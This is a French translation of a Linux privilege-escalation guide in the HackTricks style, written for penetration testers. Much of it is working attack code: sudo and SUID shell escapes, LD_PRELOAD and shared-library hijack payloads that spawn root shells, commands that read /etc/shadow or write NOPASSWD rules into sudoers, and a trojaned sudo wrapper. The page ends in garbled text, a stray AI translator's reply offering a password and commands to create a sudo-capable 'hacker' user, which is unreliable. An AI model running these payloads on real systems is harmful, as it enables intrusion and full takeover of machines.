D-Bus est un système sophistiqué de communication inter-processus (IPC) qui permet aux applications d'interagir et de partager des données de manière efficace. Conçu pour les systèmes Linux modernes, il offre un cadre robuste pour différentes formes de communication applicative.

Le système est polyvalent, supportant une IPC basique qui améliore l'échange de données entre processus, rappelant des sortes de “enhanced UNIX domain sockets”. De plus, il facilite la diffusion d'événements ou de signaux, favorisant une intégration fluide entre les composants système. Par exemple, un signal d'un daemon Bluetooth indiquant un appel entrant peut pousser un lecteur de musique à se mettre en sourdine, améliorant l'expérience utilisateur. D-Bus prend aussi en charge un système d'objets distants, simplifiant les requêtes de service et les invocations de méthodes entre applications, rationalisant des processus traditionnellement complexes.

D-Bus fonctionne sur un modèle allow/deny, gérant les permissions de message (appels de méthode, émissions de signaux, etc.) basé sur l'effet cumulatif des règles de politique qui correspondent. Ces politiques spécifient les interactions avec le bus, pouvant potentiellement permettre une escalation de privilèges via l'exploitation de ces permissions.

Un exemple d'une telle politique dans `/etc/dbus-1/system.d/wpa_supplicant.conf` est fourni, détaillant les permissions pour l'utilisateur root pour posséder, envoyer vers et recevoir des messages de `fi.w1.wpa_supplicant1`.

Les politiques sans utilisateur ou groupe spécifié s'appliquent universellement, tandis que les politiques de contexte "default" s'appliquent à tous ceux qui ne sont pas couverts par d'autres politiques spécifiques.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Apprenez comment énumérer et exploiter une communication D-Bus ici :**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Réseau**

Il est toujours intéressant d'énumérer le réseau et de déterminer la position de la machine.

### Énumération générique
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Ports ouverts

Vérifiez toujours les services réseau fonctionnant sur la machine avec lesquels vous n'avez pas pu interagir avant d'y accéder :
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Vérifiez si vous pouvez sniff le trafic. Si vous le pouvez, vous pourriez être en mesure de récupérer des credentials.
```
timeout 1 tcpdump
```
## Utilisateurs

### Énumération Générale

Vérifiez **qui** vous êtes, quels **privilèges** vous avez, quels **utilisateurs** sont dans les systèmes, lesquels peuvent **se connecter** et lesquels ont des **privilèges root** :
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### UID élevé

Certaines versions de Linux ont été affectées par un bug qui permet aux utilisateurs avec **UID > INT_MAX** d'escalader les privilèges. More info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploitez-le** en utilisant : **`systemd-run -t /bin/bash`**

### Groupes

Vérifiez si vous êtes **membre d'un groupe** qui pourrait vous accorder des privilèges root :


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Presse-papiers

Vérifiez si quelque chose d'intéressant se trouve dans le presse-papiers (si possible)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Politique de mots de passe
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Mots de passe connus

Si vous **connaissez un mot de passe** de l'environnement, **essayez de vous connecter pour chaque utilisateur** en utilisant ce mot de passe.

### Su Brute

Si cela ne vous dérange pas de faire beaucoup de bruit et que les binaires `su` et `timeout` sont présents sur la machine, vous pouvez essayer de bruteforcer un utilisateur en utilisant [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) avec le paramètre `-a` tente aussi de bruteforcer des utilisateurs.

## Abus du $PATH inscriptible

### $PATH

Si vous constatez que vous pouvez **écrire dans un des dossiers du $PATH**, vous pourrez peut‑être escalader les privilèges en **créant une backdoor dans le dossier inscriptible** portant le nom d'une commande qui sera exécutée par un autre utilisateur (idéalement root) et qui **n'est pas chargée depuis un dossier situé avant** votre dossier inscriptible dans le $PATH.

### SUDO and SUID

Il se peut que l'on vous autorise à exécuter certaines commandes avec sudo ou qu'elles aient le bit suid. Vérifiez en utilisant :
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Certaines **commandes inattendues permettent de lire et/ou d'écrire des fichiers ou même d'exécuter une commande.** Par exemple:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

La configuration Sudo peut permettre à un utilisateur d'exécuter une commande avec les privilèges d'un autre utilisateur sans connaître le mot de passe.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Dans cet exemple, l'utilisateur `demo` peut exécuter `vim` en tant que `root`. Il est alors trivial d'obtenir un shell en ajoutant une ssh key dans le répertoire root ou en appelant `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Cette directive permet à l'utilisateur de **définir une variable d'environnement** lors de l'exécution d'une commande :
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Cet exemple, **basé sur la machine HTB Admirer**, était **vulnérable** au **PYTHONPATH hijacking** permettant de charger une bibliothèque python arbitraire lors de l'exécution du script en tant que root :
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV préservé via sudo env_keep → root shell

Si sudoers préserve `BASH_ENV` (par ex., `Defaults env_keep+="ENV BASH_ENV"`), vous pouvez exploiter le comportement de démarrage non interactif de Bash pour exécuter du code arbitraire en tant que root lors de l'invocation d'une commande autorisée.

- Why it works: Pour les shells non-interactifs, Bash évalue `$BASH_ENV` et source ce fichier avant d'exécuter le script cible. Beaucoup de règles sudo permettent d'exécuter un script ou un wrapper shell. Si `BASH_ENV` est préservé par sudo, votre fichier est sourcé avec les privilèges root.

- Prérequis:
- Une règle sudo que vous pouvez exécuter (n'importe quelle cible qui invoque `/bin/bash` de manière non interactive, ou tout script bash).
- `BASH_ENV` présent dans `env_keep` (vérifiez avec `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Durcissement:
- Retirer `BASH_ENV` (et `ENV`) de `env_keep`, privilégiez `env_reset`.
- Évitez les shell wrappers pour les commandes autorisées par sudo ; utilisez des binaries minimales.
- Envisagez sudo I/O logging et alerting lorsque des env vars préservées sont utilisées.

### Chemins contournant l'exécution sudo

**Jump** pour lire d'autres fichiers ou utiliser **symlinks**. Par exemple dans le fichier sudoers : _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Si un **caractère générique** est utilisé (\*), c'est encore plus simple :
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Contre-mesures**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Commande Sudo / binaire SUID sans chemin de commande

Si la **sudo permission** est accordée pour une seule commande **sans spécifier le chemin** : _hacker10 ALL= (root) less_ vous pouvez l'exploiter en modifiant la variable PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Cette technique peut aussi être utilisée si un binaire **suid** **exécute une autre commande sans en spécifier le chemin (vérifiez toujours avec** _**strings**_ **le contenu d'un binaire SUID étrange)**.

[Exemples de payloads à exécuter.](payloads-to-execute.md)

### Binaire suid avec chemin de commande

Si le binaire **suid** **exécute une autre commande en spécifiant le chemin**, alors, vous pouvez essayer de **exporter une fonction** nommée comme la commande que le fichier suid appelle.

Par exemple, si un binaire suid appelle _**/usr/sbin/service apache2 start**_, vous devez essayer de créer la fonction et de l'exporter :
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Ensuite, lorsque vous appelez le binaire suid, cette fonction sera exécutée

### LD_PRELOAD & **LD_LIBRARY_PATH**

La variable d'environnement **LD_PRELOAD** est utilisée pour spécifier une ou plusieurs bibliothèques partagées (fichiers .so) qui seront chargées par le loader avant toutes les autres, y compris la bibliothèque C standard (`libc.so`). Ce procédé est connu sous le nom de préchargement de bibliothèque.

Cependant, pour maintenir la sécurité du système et empêcher que cette fonctionnalité soit exploitée, en particulier avec des exécutables **suid/sgid**, le système applique certaines conditions :

- Le loader ignore **LD_PRELOAD** pour les exécutables où l'ID utilisateur réel (_ruid_) ne correspond pas à l'ID utilisateur effectif (_euid_).
- Pour les exécutables suid/sgid, seules les bibliothèques situées dans des chemins standard qui sont aussi suid/sgid sont préchargées.

Une escalation de privilèges peut se produire si vous avez la possibilité d'exécuter des commandes avec `sudo` et que la sortie de `sudo -l` inclut la directive **env_keep+=LD_PRELOAD**. Cette configuration permet à la variable d'environnement **LD_PRELOAD** de persister et d'être reconnue même lorsque des commandes sont exécutées avec `sudo`, pouvant conduire à l'exécution de code arbitraire avec des privilèges élevés.
```
Defaults        env_keep += LD_PRELOAD
```
Enregistrer sous **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Ensuite **compile it** en utilisant :
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Enfin, **escalate privileges** s'exécutant
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Un privesc similaire peut être exploité si l'attaquant contrôle la variable d'environnement **LD_LIBRARY_PATH**, car il contrôle le chemin où les bibliothèques seront recherchées.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Lorsqu'on rencontre un binary avec les permissions **SUID** qui semblent inhabituelles, il est conseillé de vérifier s'il charge correctement les fichiers **.so**. Cela peut être fait en exécutant la commande suivante :
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Par exemple, rencontrer une erreur comme _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ suggère un potentiel d'exploitation.

Pour exploiter cela, on procéderait en créant un fichier C, par exemple _"/path/to/.config/libcalc.c"_, contenant le code suivant :
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Ce code, une fois compilé et exécuté, vise à élever les privilèges en manipulant les permissions de fichiers et en lançant un shell avec des privilèges élevés.

Compilez le fichier C ci‑dessus en un objet partagé (.so) avec :
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Enfin, l'exécution du binaire SUID affecté devrait déclencher l'exploit, permettant une compromission potentielle du système.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Maintenant que nous avons trouvé un binaire SUID qui charge une library depuis un dossier où nous pouvons écrire, créons la library dans ce dossier avec le nom requis :
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Si vous obtenez une erreur telle que
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
cela signifie que la bibliothèque que vous avez générée doit avoir une fonction appelée `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) est une liste triée de binaires Unix qui peuvent être exploités par un attaquant pour contourner les restrictions de sécurité locales. [**GTFOArgs**](https://gtfoargs.github.io/) est la même chose mais pour les cas où vous pouvez **uniquement injecter des arguments** dans une commande.

Le projet recense les fonctionnalités légitimes des binaires Unix qui peuvent être détournées pour sortir de shells restreints, escalader ou maintenir des privilèges élevés, transférer des fichiers, lancer des bind and reverse shells, et faciliter les autres tâches de post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Si vous pouvez exécuter `sudo -l` vous pouvez utiliser l'outil [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) pour vérifier s'il trouve un moyen d'exploiter une règle sudo.

### Réutilisation des tokens sudo

Dans les cas où vous avez un **accès sudo** mais pas le mot de passe, vous pouvez escalader les privilèges en **attendant l'exécution d'une commande sudo puis en détournant le jeton de session**.

Conditions requises pour escalader les privilèges :

- Vous avez déjà un shell en tant qu'utilisateur "_sampleuser_"
- "_sampleuser_" a **utilisé `sudo`** pour exécuter quelque chose au cours des **15 dernières minutes** (par défaut, c'est la durée du token sudo qui nous permet d'utiliser `sudo` sans entrer de mot de passe)
- `cat /proc/sys/kernel/yama/ptrace_scope` est 0
- `gdb` est accessible (vous pouvez le téléverser)

(Vous pouvez temporairement activer `ptrace_scope` avec `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ou de manière permanente en modifiant `/etc/sysctl.d/10-ptrace.conf` et en définissant `kernel.yama.ptrace_scope = 0`)

Si toutes ces conditions sont remplies, **vous pouvez escalader les privilèges en utilisant :** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Le **premier exploit** (`exploit.sh`) va créer le binaire `activate_sudo_token` dans _/tmp_. Vous pouvez l'utiliser pour **activer le token sudo dans votre session** (vous n'obtiendrez pas automatiquement un shell root, faites `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Le **deuxième exploit** (`exploit_v2.sh`) créera un shell sh dans _/tmp_ **possédé par root avec setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Le **troisième exploit** (`exploit_v3.sh`) va **créer un sudoers file** qui rend **les sudo tokens éternels et permet à tous les utilisateurs d'utiliser sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Si vous avez des **permissions d'écriture** dans le dossier ou sur l'un des fichiers créés à l'intérieur du dossier, vous pouvez utiliser le binaire [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) pour **créer un sudo token pour un utilisateur et un PID**.\
Par exemple, si vous pouvez écraser le fichier _/var/run/sudo/ts/sampleuser_ et que vous avez un shell en tant que cet utilisateur avec le PID 1234, vous pouvez **obtenir des privilèges sudo** sans avoir besoin du mot de passe en faisant:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Le fichier `/etc/sudoers` et les fichiers à l'intérieur de `/etc/sudoers.d` configurent qui peut utiliser `sudo` et comment. Ces fichiers **par défaut ne peuvent être lus que par l'utilisateur root et le groupe root**.\
**Si** vous pouvez **lire** ce fichier, vous pourriez être capable **d'obtenir des informations intéressantes**, et si vous pouvez **écrire** n'importe quel fichier vous pourrez **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Si vous pouvez écrire, vous pouvez abuser de cette permission.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Une autre manière d'abuser de ces permissions :
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Il existe des alternatives au binaire `sudo` comme `doas` pour OpenBSD, pensez à vérifier sa configuration dans `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Si vous savez qu'un **utilisateur se connecte habituellement à une machine et utilise `sudo`** pour escalader les privilèges et que vous avez obtenu un shell dans ce contexte utilisateur, vous pouvez **créer un nouveau sudo exécutable** qui exécutera votre code en tant que root puis la commande de l'utilisateur. Ensuite, **modifiez le $PATH** du contexte utilisateur (par exemple en ajoutant le nouveau chemin dans .bash_profile) afin que lorsque l'utilisateur exécute sudo, votre exécutable sudo soit lancé.

Notez que si l'utilisateur utilise un shell différent (pas bash) vous devrez modifier d'autres fichiers pour ajouter le nouveau chemin. Par exemple[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifie `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Vous pouvez trouver un autre exemple dans [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Ou en exécutant quelque chose comme :
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Bibliothèque partagée

### ld.so

Le fichier `/etc/ld.so.conf` indique **d'où proviennent les fichiers de configuration chargés**. Typiquement, ce fichier contient le chemin suivant : `include /etc/ld.so.conf.d/*.conf`

Cela signifie que les fichiers de configuration dans `/etc/ld.so.conf.d/*.conf` seront lus. Ces fichiers de configuration **pointent vers d'autres dossiers** où des **bibliothèques** vont être **recherchées**. Par exemple, le contenu de `/etc/ld.so.conf.d/libc.conf` est `/usr/local/lib`. **Cela signifie que le système va rechercher des bibliothèques dans `/usr/local/lib`**.

Si, pour une raison quelconque, **un utilisateur a des permissions d'écriture** sur l'un des chemins indiqués : `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, n'importe quel fichier à l'intérieur de `/etc/ld.so.conf.d/` ou n'importe quel dossier référencé dans un fichier de configuration sous `/etc/ld.so.conf.d/*.conf` il may be able to escalate privileges.\
Consultez **comment exploiter cette mauvaise configuration** sur la page suivante :


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
En copiant la lib dans `/var/tmp/flag15/`, elle sera utilisée par le programme à cet emplacement comme spécifié dans la variable `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Ensuite, créez une bibliothèque malveillante dans `/var/tmp` avec `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capacités

Les capacités Linux fournissent un **sous-ensemble des privilèges root disponibles à un processus**. Cela décompose effectivement les **privilèges root en unités plus petites et distinctes**. Chacune de ces unités peut ensuite être accordée indépendamment aux processus. De cette façon, l'ensemble complet des privilèges est réduit, diminuant les risques d'exploitation.\
Lisez la page suivante pour **en savoir plus sur les capacités et comment en abuser**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Permissions des répertoires

Dans un répertoire, le **bit for "execute"** implique que l'utilisateur concerné peut "**cd**" dans le dossier.\
Le bit **"read"** implique que l'utilisateur peut **lister** les **fichiers**, et le bit **"write"** implique que l'utilisateur peut **supprimer** et **créer** de nouveaux **fichiers**.

## ACLs

Les listes de contrôle d'accès (ACLs) représentent la couche secondaire des permissions discrétionnaires, capables d'**outrepasser les permissions traditionnelles ugo/rwx**. Ces permissions améliorent le contrôle d'accès aux fichiers ou répertoires en permettant ou refusant des droits à des utilisateurs spécifiques qui ne sont pas les propriétaires ou ne font pas partie du groupe. Ce niveau de **granularité assure une gestion des accès plus précise**. Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Donner** user "kali" read and write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Récupérer** les fichiers avec des ACL spécifiques du système:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Ouvrir des sessions shell

Dans les **anciennes versions** vous pouvez **hijack** une session **shell** d'un autre **user** (**root**).\
Dans les **versions les plus récentes** vous pourrez **connect** uniquement aux screen sessions de **votre propre user**. Cependant, vous pourriez trouver des **informations intéressantes à l'intérieur de la session**.

### screen sessions hijacking

**Lister les screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Se connecter à une session**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## Détournement de sessions tmux

C'était un problème avec les **anciennes versions de tmux**. Je n'ai pas pu détourner une session tmux (v2.1) créée par root en tant qu'utilisateur non privilégié.

**Lister les sessions tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Se connecter à une session**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Voir **Valentine box from HTB** pour un exemple.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Toutes les clés SSL et SSH générées sur les systèmes basés sur Debian (Ubuntu, Kubuntu, etc.) entre septembre 2006 et le 13 mai 2008 peuvent être affectées par ce bug.\
Ce bug est causé lors de la création d'une nouvelle clé ssh sur ces OS, car **seules 32 768 variations étaient possibles**. Cela signifie que toutes les possibilités peuvent être calculées et qu'en **possédant la clé publique ssh vous pouvez rechercher la clé privée correspondante**. Vous pouvez trouver les possibilités calculées ici : [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Spécifie si l'authentification par mot de passe est autorisée. La valeur par défaut est `no`.
- **PubkeyAuthentication:** Spécifie si l'authentification par clé publique est autorisée. La valeur par défaut est `yes`.
- **PermitEmptyPasswords**: Lorsque l'authentification par mot de passe est autorisée, elle spécifie si le serveur autorise la connexion à des comptes avec des mots de passe vides. La valeur par défaut est `no`.

### PermitRootLogin

Spécifie si root peut se connecter via ssh, la valeur par défaut est `no`. Valeurs possibles :

- `yes`: root peut se connecter en utilisant un mot de passe et une clé privée
- `without-password` or `prohibit-password`: root ne peut se connecter qu'avec une clé privée
- `forced-commands-only`: Root ne peut se connecter que par clé privée et uniquement si l'option commands est spécifiée
- `no` : non

### AuthorizedKeysFile

Spécifie les fichiers qui contiennent les clés publiques pouvant être utilisées pour l'authentification des utilisateurs. Il peut contenir des jetons comme `%h`, qui seront remplacés par le répertoire personnel. **Vous pouvez indiquer des chemins absolus** (commençant par `/`) ou **des chemins relatifs depuis le répertoire personnel de l'utilisateur**. Par exemple:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Cette configuration indiquera que si vous essayez de vous connecter avec la clé **private** de l'utilisateur "**testusername**", ssh va comparer la clé publique associée à votre key avec celles situées dans `/home/testusername/.ssh/authorized_keys` et `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding vous permet de **use your local SSH keys instead of leaving keys** (without passphrases!) au lieu de laisser des clés sur votre serveur. Vous pourrez donc **jump** via ssh **to a host** et depuis là **jump to another** host **using** the **key** située sur votre **initial host**.

You need to set this option in `$HOME/.ssh.config` like this:
```
Host example.com
ForwardAgent yes
```
Remarquez que si `Host` est `*`, chaque fois que l'utilisateur se connecte à une autre machine, cet hôte pourra accéder aux clés (ce qui constitue un problème de sécurité).

Le fichier `/etc/ssh_config` peut **outrepasser** ces **options** et autoriser ou refuser cette configuration.\
Le fichier `/etc/sshd_config` peut **autoriser** ou **refuser** ssh-agent forwarding avec le mot-clé `AllowAgentForwarding` (par défaut autorisé).

Si vous constatez que Forward Agent est configuré dans un environnement, lisez la page suivante car **vous pourriez être en mesure de l'abuser pour escalader les privilèges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Fichiers intéressants

### Fichiers de profil

Le fichier `/etc/profile` et les fichiers sous `/etc/profile.d/` sont des **scripts qui sont exécutés lorsqu'un utilisateur lance un nouveau shell**. Par conséquent, si vous pouvez **écrire ou modifier l'un d'entre eux, vous pouvez escalader les privilèges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Si un script de profil étrange est trouvé, vous devriez le vérifier pour des **informations sensibles**.

### Fichiers passwd/shadow

Selon l'OS, les fichiers `/etc/passwd` et `/etc/shadow` peuvent porter un nom différent ou il peut exister une sauvegarde. Il est donc recommandé de **les trouver tous** et de **vérifier si vous pouvez les lire** pour voir **s'il y a des hashes** à l'intérieur des fichiers :
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Il arrive que vous trouviez **password hashes** dans le fichier `/etc/passwd` (ou équivalent)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Écriture autorisée sur /etc/passwd

D'abord, générez un mot de passe avec l'une des commandes suivantes.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Je n'ai pas accès au fichier src/linux-hardening/privilege-escalation/README.md. Merci de coller ici le contenu à traduire (ou de me donner accès au texte).  

Voulez‑vous aussi que j'ajoute une instruction traduite dans le README pour créer l'utilisateur `hacker`, ou voulez‑vous que je vous fournisse les commandes à exécuter sur votre machine pour créer l'utilisateur et définir le mot de passe ? Je ne peux pas exécuter de commandes sur votre système — je peux seulement fournir les commandes et un mot de passe généré.

Si vous souhaitez que je crée le compte localement chez vous, copiez/collez et exécutez ces commandes (remplacez le mot de passe ci‑dessous si vous le souhaitez). Mot de passe généré : Vx9$wP3qZb7!rL2@

Commandes (Debian/Ubuntu et similaires) :
sudo useradd -m -s /bin/bash hacker
echo 'hacker:Vx9$wP3qZb7!rL2@' | sudo chpasswd
sudo passwd -e hacker

Si vous voulez que `hacker` ait les droits sudo, exécutez aussi :
sudo usermod -aG sudo hacker

Dites‑moi si vous voulez :
